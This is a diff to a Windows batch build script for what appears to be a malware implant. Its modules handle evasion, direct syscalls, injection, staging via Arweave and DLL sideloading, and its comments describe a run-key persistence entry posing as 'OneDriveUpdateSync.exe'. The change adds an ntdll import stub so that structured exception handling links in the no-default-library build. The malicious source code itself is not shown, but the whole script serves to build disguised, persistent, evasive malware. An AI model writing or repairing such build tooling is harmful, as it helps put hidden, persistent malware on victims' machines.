@@ -33,14 +33,14 @@ REM     Persist.c: writes HKCU run-key pointing at OneDriveUpdateSync.exe
 IF NOT DEFINED OUTNAME SET OUTNAME=OneDriveUpdateSync.exe
 SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Gadgets.c Install.c Persist.c Inject.c
 SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
-SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS /MANIFEST:EMBED /MANIFESTUAC:"level='asInvoker' uiAccess='false'" kernel32.lib user32.lib
+SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS /MANIFEST:EMBED /MANIFESTUAC:"level='asInvoker' uiAccess='false'" kernel32.lib user32.lib __cspec.lib
 
 REM --- Override for sideload DLL build ---
 IF "%1"=="sideload" (
     SET OUTNAME=sideload.dll
     SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Gadgets.c Install.c Persist.c Inject.c
     SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL"
-    SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib ole32.lib advapi32.lib shlwapi.lib winmm.lib /INCLUDE:__imp_CoInitialize /INCLUDE:__imp_CoUninitialize /INCLUDE:__imp_CoTaskMemAlloc /INCLUDE:__imp_RegOpenKeyExA /INCLUDE:__imp_RegQueryValueExA /INCLUDE:__imp_RegCloseKey /INCLUDE:__imp_PathCombineA /INCLUDE:__imp_PathFileExistsA /INCLUDE:__imp_timeGetTime /INCLUDE:__imp_timeBeginPeriod"
+    SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib __cspec.lib ole32.lib advapi32.lib shlwapi.lib winmm.lib /INCLUDE:__imp_CoInitialize /INCLUDE:__imp_CoUninitialize /INCLUDE:__imp_CoTaskMemAlloc /INCLUDE:__imp_RegOpenKeyExA /INCLUDE:__imp_RegQueryValueExA /INCLUDE:__imp_RegCloseKey /INCLUDE:__imp_PathCombineA /INCLUDE:__imp_PathFileExistsA /INCLUDE:__imp_timeGetTime /INCLUDE:__imp_timeBeginPeriod"
     echo [*] Building DLL sideload variant...
     echo [*] Persist: HKCU run-key pointing to OneDriveUpdateSync.exe
 )
@@ -59,6 +59,16 @@ IF "%1"=="sideload" IF EXIST Sideload.rc (
     IF %ERRORLEVEL% NEQ 0 ( echo [!] Resource compile failed & exit /b 1 )
     SET RESFILE=Sideload.res
 )
+
+REM --- Build minimal ntdll import lib for __C_specific_handler ---
+REM     The Windows SDK ntdll.lib omits this symbol; ntdll.dll exports it but we
+REM     need an import stub so the linker can wire up __try/__except in /NODEFAULTLIB.
+echo LIBRARY ntdll.dll>__cspec.def
+echo EXPORTS>>__cspec.def
+echo     __C_specific_handler>>__cspec.def
+lib /machine:x64 /def:__cspec.def /out:__cspec.lib /nologo
+IF %ERRORLEVEL% NEQ 0 ( echo [!] __cspec.lib generation failed & exit /b 1 )
+del /Q __cspec.def 2>nul
 
 echo [*] Assembling...
 ml64 /c /nologo AsmStub.asm >nul
